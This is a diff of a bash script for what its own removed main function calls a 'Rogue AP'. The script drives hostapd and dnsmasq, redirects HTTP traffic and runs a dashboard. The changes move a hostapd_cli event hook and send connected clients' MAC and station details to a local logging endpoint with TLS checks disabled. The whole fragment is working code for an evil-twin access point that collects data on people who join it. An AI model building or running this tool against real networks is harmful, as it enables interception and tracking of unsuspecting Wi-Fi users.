@@ -72,7 +72,16 @@ echo "[*] Setting up hostapd event monitoring..."
 monitor_hostapd_events() {
     echo "[DEBUG] Starting hostapd event monitoring..."
     
-    # Start monitoring loop
+    # Clear any existing monitors
+    sudo pkill -f "hostapd_cli -i wlan0 -a"
+    
+    # Start hostapd_cli in monitor mode to catch all events
+    sudo hostapd_cli -i wlan0 -a /bin/bash -c '
+        # Send the raw event to our logging endpoint
+        curl -X POST -H "Content-Type: text/plain" --data-binary "$0" https://localhost/api/log -k
+    ' &
+    
+    # Start monitoring loop for active polling
     while true; do
         # Check if hostapd is running
         if ! pgrep hostapd > /dev/null; then
@@ -91,11 +100,7 @@ monitor_hostapd_events() {
                     INFO=$(sudo hostapd_cli -i wlan0 sta "$mac" 2>/dev/null)
                     if [ $? -eq 0 ]; then
                         echo "[DEBUG] Station info for $mac: $INFO"
-                        # Send connect event
-                        curl -s -X POST -H "Content-Type: application/json" \
-                             -d "{\"type\":\"connect\",\"mac\":\"$mac\"}" \
-                             http://localhost:443/api/events
-                        echo "[DEBUG] Sent connect event for $mac"
+                        echo "$INFO" | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://localhost/api/log -k
                     fi
                 fi
             done
@@ -211,38 +216,5 @@ while true; do
         echo "[↻] Menu refreshed. Press [1] to quit or [2] to open dashboard."
     fi
 done
-
-# Function to monitor hostapd logs and send them to Flask
-monitor_hostapd() {
-    # Clear any existing monitor
-    pkill -f "hostapd_cli -i wlan0 -a"
-    
-    # Start hostapd_cli in monitor mode
-    hostapd_cli -i wlan0 -a /bin/bash -c '
-        curl -X POST -H "Content-Type: text/plain" --data-binary "$0" https://localhost/api/log -k
-    ' &
-    
-    echo "[*] Started hostapd monitor"
-}
-
-# Main script
-main() {
-    check_root
-    check_dependencies
-    setup_network_manager
-    configure_interface
-    start_hostapd
-    monitor_hostapd
-    start_dnsmasq
-    configure_routing
-    start_http_redirect
-    start_dashboard
-    
-    echo "[*] Rogue AP is running"
-    echo "[*] Press Ctrl+C to stop..."
-    wait
-}
-
-main
 
 
